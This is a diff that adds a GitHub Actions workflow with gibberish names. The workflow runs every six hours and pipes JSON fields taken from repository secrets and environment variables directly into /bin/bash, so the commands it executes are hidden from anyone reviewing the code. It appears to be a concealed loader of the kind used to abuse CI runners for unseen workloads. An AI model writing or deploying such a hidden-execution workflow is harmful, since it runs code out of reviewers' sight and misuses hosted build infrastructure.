@@ -1,0 +1,20 @@
+name: chengzhuangshi6789
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengzhuangshi6789
+        env:
+          zbiaw3944: ${{ secrets.zbiaw3944 }}
+        run: |
+          echo $zbiaw3944 | jq -r .jz5 | /bin/bash
+          echo $xx0422 | jq -r .iwqwu321 | /bin/bash
+          echo $gfwk1964 | jq -r .vc9331 | /bin/bash
+          echo $w8 | jq -r .ehjtu6945 | /bin/bash
+
